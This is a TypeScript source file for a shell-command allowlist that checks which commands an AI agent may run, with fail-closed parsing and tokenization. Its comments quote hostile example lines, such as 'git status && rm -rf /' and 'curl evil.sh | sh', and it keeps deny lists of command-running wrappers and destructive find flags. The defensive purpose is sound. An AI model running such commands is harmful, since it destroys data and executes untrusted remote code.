import { rcError } from "@routecraft/routecraft";

/**
 * Command-pattern matching for the agent-exposure boundary.
 *
 * This is the allowlist that turns `Bash(git status:*)` in an agent file
 * into a decision about a command the model just proposed. It is
 * convenience layered over isolation, never the boundary itself:
 * isolation and argument hygiene apply to permitted commands exactly as
 * they apply to any other. What this adds is that a model cannot reach
 * commands nobody granted it.
 *
 * It lives next to `shell()` rather than in the agent package because it
 * is a fact about shell command lines, and because a matcher this
 * security-relevant is never template code.
 *
 * ## Why matching is not a prefix test
 *
 * A naive `command.startsWith(pattern)` allowlist is defeated by the first
 * thing anyone tries. `git status && rm -rf /` starts with `git status`.
 * So does `git status; curl evil.sh | sh`. And `git statusfoo` starts with
 * it too, on a raw string test. Everything below exists to close one of
 * those, and each rule fails closed: anything the parser cannot account
 * for is denied rather than passed along.
 */

/** Whether a command may run, and why not when it may not. */
export interface CommandDecision {
  readonly allowed: boolean;
  /** Present when denied: a reason a model can read and act on. */
  readonly reason?: string;
}

/** A compiled allowlist. */
export interface CommandMatcher {
  (command: string): CommandDecision;
  /** The specifiers this matcher was built from, for diagnostics. */
  readonly patterns: readonly string[];
}

/** One parsed specifier. */
interface CompiledPattern {
  /** Literal words the command must begin with. */
  readonly words: readonly string[];
  /** True for a `:*` specifier, which allows trailing arguments. */
  readonly prefix: boolean;
  /** The specifier as written, for diagnostics. */
  readonly source: string;
}

type Token =
  | { readonly kind: "word"; readonly value: string }
  | { readonly kind: "operator"; readonly value: string };

/**
 * Shell operators that separate one command from the next. Every one of
 * them starts a new subcommand that must be permitted in its own right,
 * which is what stops `&&` and `;` from smuggling a second command past a
 * grant written for the first.
 */
const OPERATORS = ["|&", "&&", "||", ";;", ";", "|", "&", "\n"] as const;

/**
 * Constructs whose effect cannot be read off the command line, so no
 * pattern can honestly be said to cover them.
 *
 * Command and process substitution run a command that is not written as a
 * command: `echo $(curl evil.sh)` matches a grant for `echo` while running
 * something nobody granted. Redirection writes to a path chosen by the
 * command rather than by the grant, which turns a permitted `echo` into
 * an arbitrary file write. Both are refused outright.
 */
const SUBSTITUTIONS: readonly {
  readonly token: string;
  readonly what: string;
}[] = [
  { token: "$(", what: "command substitution" },
  { token: "`", what: "command substitution" },
  { token: "<(", what: "process substitution" },
  { token: ">(", what: "process substitution" },
  { token: "${", what: "parameter expansion" },
];

/** Redirection operators, refused for the reason given above. */
const REDIRECTIONS = [">>", "<<", ">", "<"] as const;

/**
 * Wrappers that run another command with its argv intact. Stripping them
 * exposes the real command to matching, which makes the allowlist stricter
 * rather than looser: `timeout 5 rm -rf /` is matched as `rm -rf /`, so a
 * grant for `timeout` cannot launder it.
 */
const WRAPPERS: Record<string, (words: readonly string[]) => number> = {
  // `timeout [OPTIONS] DURATION CMD...`: options, then a duration to drop.
  timeout: (words) => {
    let i = 1;
    while (i < words.length && words[i]!.startsWith("-")) i++;
    return i < words.length ? i + 1 : words.length;
  },
  // `nice [-n N] CMD...`
  nice: (words) => {
    let i = 1;
    while (i < words.length && words[i]!.startsWith("-")) {
      i += words[i] === "-n" ? 2 : 1;
    }
    return i;
  },
  nohup: () => 1,
  // Only BARE `xargs`. With options it can rewrite the command line it
  // builds (`-I`, `-a`, `-E`), so what actually runs is no longer what is
  // written, and the strip would be a guess.
  xargs: (words) => (words[1]?.startsWith("-") ? -1 : 1),
};

/**
 * Commands that take another command as an argument and run it, at a
 * position that depends on their own options.
 *
 * These are not stripped like the wrappers above, because the inner
 * command cannot be located reliably enough to match it. They are refused
 * unless a pattern names the whole command line exactly: an operator who
 * writes out `flock /tmp/x -c "make build"` in full has made a specific,
 * auditable grant, whereas `Bash(flock:*)` would be a grant of everything.
 */
const EXEC_WRAPPERS = new Set([
  "watch",
  "setsid",
  "flock",
  "env",
  "sudo",
  "doas",
  "chroot",
  "unshare",
  "nsenter",
  "script",
  "stdbuf",
  "time",
]);

/**
 * Per-command destructive forms that a prefix grant must never cover.
 *
 * `find` is the canonical case: `Bash(find:*)` is a reasonable thing to
 * grant for searching, and `find . -delete` is not what the person who
 * granted it had in mind.
 */
const DESTRUCTIVE_FLAGS: Record<string, readonly string[]> = {
  find: ["-delete", "-exec", "-execdir", "-ok", "-okdir", "-fls", "-fprint"],
};

/**
 * Compile agent-file specifiers into a matcher.
 *
 * @param specifiers - Specifier bodies as written, e.g. `git status:*`
 * @throws RC5003 when a specifier is empty or malformed
 *
 * @example
 * ```typescript
 * const allowed = commandMatcher(["git status:*", "ls"]);
 * allowed("git status --short");     // { allowed: true }
 * allowed("git status && rm -rf /"); // { allowed: false, reason: ... }
 * ```
 */
export function commandMatcher(specifiers: readonly string[]): CommandMatcher {
  const patterns = parseCommandPatterns(specifiers);
  const matcher = (command: string): CommandDecision =>
    decide(command, patterns);
  return Object.assign(matcher, {
    patterns: specifiers.map((s) => s),
  }) as CommandMatcher;
}

/**
 * Parse specifier bodies into compiled patterns.
 *
 * Exported for the specifier seam, which validates an agent file's
 * specifiers at load time rather than leaving a typo to surface as a
 * mysterious denial on the first tool call.
 *
 * @internal
 */
export function parseCommandPatterns(
  specifiers: readonly string[],
): CompiledPattern[] {
  return specifiers.map((source) => {
    const trimmed = source.trim();
    if (trimmed === "") {
      throw rcError("RC5003", undefined, {
        message: `Bash(): an empty command pattern permits nothing and is more likely a typo than an intent. Write a command, or a prefix such as "git status:*".`,
      });
    }
    if (trimmed === "*") return { words: [], prefix: true, source };
    const prefix = trimmed.endsWith(":*");
    const body = prefix ? trimmed.slice(0, -2).trim() : trimmed;
    if (body === "") {
      throw rcError("RC5003", undefined, {
        message: `Bash(): the pattern "${source}" has no command before its ":*". Write the command it should permit, such as "git status:*".`,
      });
    }
    return { words: body.split(/\s+/), prefix, source };
  });
}

function decide(
  command: string,
  patterns: readonly CompiledPattern[],
): CommandDecision {
  if (typeof command !== "string" || command.trim() === "") {
    return { allowed: false, reason: "an empty command was proposed" };
  }

  const tokens = tokenize(command);
  if ("error" in tokens) return { allowed: false, reason: tokens.error };

  const subcommands = splitSubcommands(tokens.tokens);
  if (subcommands.length === 0) {
    return { allowed: false, reason: "the command contains no command to run" };
  }

  // EVERY subcommand must be permitted. A command line is only as
  // trustworthy as its least trustworthy part.
  for (const words of subcommands) {
    const decision = decideOne(words, patterns);
    if (!decision.allowed) {
      return subcommands.length === 1
        ? decision
        : {
            allowed: false,
            reason: `${decision.reason} (in "${words.join(" ")}", one of ${String(subcommands.length)} commands on this line; every one of them must be permitted)`,
          };
    }
  }
  return { allowed: true };
}

function decideOne(
  words: readonly string[],
  patterns: readonly CompiledPattern[],
): CommandDecision {
  const exactlyMatched = patterns.some(
    (p) => !p.prefix && sameWords(p.words, words),
  );

  const carveOut = carveOutReason(words);
  // An exact pattern is a deliberate, fully written-out grant, so it still
  // stands. A prefix pattern is not allowed to reach a carve-out: that is
  // the whole point of carving it out.
  if (carveOut !== undefined && !exactlyMatched) {
    return { allowed: false, reason: carveOut };
  }
  if (exactlyMatched) return { allowed: true };

  const stripped = stripWrappers(words);
  if (stripped === undefined) {
    return {
      allowed: false,
      reason: `"${words[0]}" is being used with options that change what it runs, so what would actually execute cannot be read off the command line`,
    };
  }
  // Re-check after stripping: `timeout 5 find . -delete` hides its carve-out
  // behind a wrapper.
  const strippedCarveOut =
    stripped !== words ? carveOutReason(stripped) : undefined;
  if (strippedCarveOut !== undefined) {
    return { allowed: false, reason: strippedCarveOut };
  }

  for (const pattern of patterns) {
    if (matchesPattern(pattern, stripped)) return { allowed: true };
  }
  return {
    allowed: false,
    reason:
      patterns.length === 0
        ? `no command patterns are granted to this agent`
        : `"${stripped.join(" ")}" matches none of the granted patterns (${patterns.map((p) => p.source).join(", ")})`,
  };
}

/**
 * Match on whole words, never on raw string prefixes. `git status` must
 * not permit `git statusfoo`, and it would on a `startsWith` test.
 */
function matchesPattern(
  pattern: CompiledPattern,
  words: readonly string[],
): boolean {
  if (pattern.prefix) {
    if (words.length < pattern.words.length) return false;
    return pattern.words.every((word, i) => words[i] === word);
  }
  return sameWords(pattern.words, words);
}

function sameWords(a: readonly string[], b: readonly string[]): boolean {
  return a.length === b.length && a.every((word, i) => b[i] === word);
}

function carveOutReason(words: readonly string[]): string | undefined {
  const head = words[0];
  if (head === undefined) return "the command is empty";
  if (EXEC_WRAPPERS.has(head)) {
    return `"${head}" runs another command chosen by its own arguments, so a pattern cannot say what it would execute; grant the exact command line if this is intended`;
  }
  const flags = DESTRUCTIVE_FLAGS[head];
  if (flags) {
    const found = words.find((word) =>
      flags.some((flag) => word === flag || word.startsWith(`${flag}=`)),
    );
    if (found !== undefined) {
      return `"${head} ${found}" modifies or executes rather than reads, so a prefix grant for "${head}" does not cover it`;
    }
  }
  return undefined;
}

/**
 * Remove wrappers until the real command is exposed. Returns `undefined`
 * when a wrapper is used in a form whose inner command cannot be located,
 * which is a denial rather than a pass-through.
 */
function stripWrappers(
  words: readonly string[],
): readonly string[] | undefined {
  let current = words;
  // Bounded so a pathological input cannot spin here; no real command line
  // nests wrappers anywhere near this deep.
  for (let depth = 0; depth < 8; depth++) {
    const head = current[0];
    if (head === undefined) return current;
    const strip = WRAPPERS[head];
    if (!strip) return current;
    const skip = strip(current);
    if (skip < 0) return undefined;
    const next = current.slice(skip);
    if (next.length === 0) return undefined;
    current = next;
  }
  return undefined;
}

/** Group tokens into subcommands, dropping the operators between them. */
function splitSubcommands(tokens: readonly Token[]): string[][] {
  const groups: string[][] = [];
  let current: string[] = [];
  for (const token of tokens) {
    if (token.kind === "operator") {
      if (current.length > 0) groups.push(current);
      current = [];
      continue;
    }
    current.push(token.value);
  }
  if (current.length > 0) groups.push(current);
  return groups;
}

/**
 * Split a command line into words and operators, honouring quoting.
 *
 * Quote awareness is not a nicety: without it, `echo "a && b"` reads as
 * two commands and `git commit -m "fix; ship"` is refused. Anything the
 * parser cannot account for returns an error, and every caller treats an
 * error as a denial.
 */
function tokenize(command: string): { tokens: Token[] } | { error: string } {
  const tokens: Token[] = [];
  let word = "";
  let hasWord = false;

  const flush = (): void => {
    if (hasWord) {
      tokens.push({ kind: "word", value: word });
      word = "";
      hasWord = false;
    }
  };

  for (let i = 0; i < command.length; i++) {
    const char = command[i]!;

    for (const { token, what } of SUBSTITUTIONS) {
      if (command.startsWith(token, i)) {
        return {
          error: `the command uses ${what} ("${token}"), which runs or resolves something the pattern cannot see`,
        };
      }
    }

    if (char === "\\") {
      const next = command[i + 1];
      if (next === undefined) {
        return { error: "the command ends in a trailing backslash" };
      }
      word += next;
      hasWord = true;
      i++;
      continue;
    }

    if (char === "'" || char === '"') {
      const closed = readQuoted(command, i, char);
      if (closed === undefined) {
        return {
          error: `the command has an unterminated ${char === "'" ? "single" : "double"} quote`,
        };
      }
      word += closed.value;
      hasWord = true;
      i = closed.end;
      continue;
    }

    const redirection = REDIRECTIONS.find((op) => command.startsWith(op, i));
    if (redirection !== undefined) {
      return {
        error: `the command redirects ("${redirection}"), which writes somewhere the pattern does not name`,
      };
    }

    const operator = OPERATORS.find((op) => command.startsWith(op, i));
    if (operator !== undefined) {
      flush();
      tokens.push({ kind: "operator", value: operator });
      i += operator.length - 1;
      continue;
    }

    if (/\s/.test(char)) {
      flush();
      continue;
    }

    word += char;
    hasWord = true;
  }
  flush();
  return { tokens };
}

/**
 * Read a quoted run starting at `start`. Single quotes are literal;
 * double quotes honour backslash escapes, matching how a shell would read
 * them, so the matcher sees the same words the shell would.
 */
function readQuoted(
  command: string,
  start: number,
  quote: string,
): { value: string; end: number } | undefined {
  let value = "";
  for (let i = start + 1; i < command.length; i++) {
    const char = command[i]!;
    if (char === quote) return { value, end: i };
    if (quote === '"' && char === "\\") {
      const next = command[i + 1];
      if (next === undefined) return undefined;
      value += next;
      i++;
      continue;
    }
    value += char;
  }
  return undefined;
}

/**
 * Build a call-time guard from agent-file specifiers.
 *
 * This is the whole framework-side contract for exposing `shell()` to an
 * agent: the tool's registration hands its specifiers here and gets back
 * the function that decides each call, so the wiring that registers the
 * tool carries configuration rather than security logic.
 *
 * A denied command throws `OS2001` with the reason, which reaches the
 * model as a tool error it can act on. Denial is deliberately not tool
 * removal: a model that can see the tool and read why a command was
 * refused can retry with a permitted form, where a model whose tool
 * vanished can only guess.
 *
 * @param specifiers - Specifier bodies from the agent's tool list
 * @param commandKey - Input field carrying the command line
 * @throws RC5003 at compile time when a specifier is malformed
 *
 * @example
 * ```typescript
 * { kind: "command-pattern", compile: commandPatternGuard }
 * ```
 */
export function commandPatternGuard(
  specifiers: readonly string[],
  commandKey = "command",
): (input: unknown) => void {
  const matcher = commandMatcher(specifiers);
  return (input: unknown): void => {
    const command = (input as Record<string, unknown> | null)?.[commandKey];
    if (typeof command !== "string") {
      throw rcError("OS2001", undefined, {
        message: `The tool call carried no "${commandKey}" string, so there is no command to check against the allowlist.`,
      });
    }
    const decision = matcher(command);
    if (decision.allowed) return;
    throw rcError("OS2001", undefined, {
      message: `Command not permitted: ${decision.reason}.`,
    });
  };
}
